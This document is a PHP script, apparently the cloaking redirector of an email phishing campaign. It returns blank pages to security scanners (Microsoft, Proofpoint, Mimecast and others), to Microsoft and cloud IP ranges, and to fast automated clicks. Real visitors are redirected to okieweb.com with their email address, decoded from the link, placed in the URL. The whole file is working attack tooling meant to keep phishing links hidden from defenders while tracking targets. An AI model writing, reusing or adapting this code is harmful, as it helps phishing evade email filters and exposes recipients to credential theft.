<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';

// Bots por User-Agent
$bot_agents = [
    'Microsoft Office', 'msnbot', 'Outlook-iOS',
    'Google-Safety', 'Barracuda', 'Proofpoint',
    'Mimecast', 'Sophos', 'Symantec',
    'curl', 'python-requests', 'Go-http-client',
    'Wget', 'libwww-perl'
];
foreach ($bot_agents as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        http_response_code(200);
        exit;
    }
}

// Ranges Microsoft
$microsoft_ranges = [
    ['20.64.0.0',   '20.127.255.255'],
    ['4.144.0.0',   '4.159.255.255'],
    ['20.192.0.0',  '20.255.255.255'],
    ['20.226.12.0', '20.226.12.255'],
    ['40.80.0.0',   '40.95.255.255'],
    ['13.64.0.0',   '13.95.255.255'],
    ['52.160.0.0',  '52.191.255.255'],
    ['13.104.0.0',  '13.107.255.255'],
    ['20.0.0.0',    '20.31.255.255'],
    ['172.160.0.0', '172.191.255.255'],
    ['52.96.0.0',   '52.111.255.255'],
    ['52.112.0.0',  '52.115.255.255'],
    ['104.40.0.0',  '104.47.255.255'],
    ['4.192.0.0',   '4.207.255.255'],
];
$ip_long = ip2long($ip);
if ($ip_long !== false) {
    foreach ($microsoft_ranges as $range) {
        if ($ip_long >= ip2long($range[0]) && $ip_long <= ip2long($range[1])) {
            http_response_code(200);
            exit;
        }
    }
}

// Ranges AWS/GCP
$bot_ip_prefixes = ['54.', '52.1', '34.', '35.', '185.220.'];
foreach ($bot_ip_prefixes as $prefix) {
    if (strpos($ip, $prefix) === 0) {
        http_response_code(200);
        exit;
    }
}

// Timing
$sent_time = $_GET['t'] ?? 0;
if ($sent_time && (time() - (int)$sent_time) < 3) {
    http_response_code(200);
    exit;
}

// ── Extrai email da URL ──────────────────────────────────────────
$requestUri = $_SERVER['REQUEST_URI'] ?? '';
$email = '';

// Tenta base64 em cada segmento
$path = strtok($requestUri, '?');
foreach (explode('/', trim($path, '/')) as $part) {
    if (empty($part)) continue;
    $decoded = base64_decode(strtr(rtrim($part, '='), '-_', '+/'), true);
    if ($decoded && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
        $email = $decoded;
        break;
    }
}

// Fallback: email cru na URL
if (empty($email)) {
    if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $path, $m)) {
        $email = $m[1];
    }
}

// ── Redireciona ──────────────────────────────────────────────────
$baseUrl = 'https://www.okieweb.com/';

function generateSegment($length) {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $result = '';
    for ($i = 0; $i < $length; $i++) {
        $result .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $result;
}

if (!empty($email)) {
    $urls = [
        $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
        $baseUrl . generateSegment(8) . '/' . $email . '/' . generateSegment(8),
    ];
} else {
    $urls = [
        $baseUrl . generateSegment(8) . '/' . generateSegment(8),
        $baseUrl . generateSegment(8) . '/' . generateSegment(8),
    ];
}

header("Location: " . $urls[array_rand($urls)], true, 302);
exit();
?>
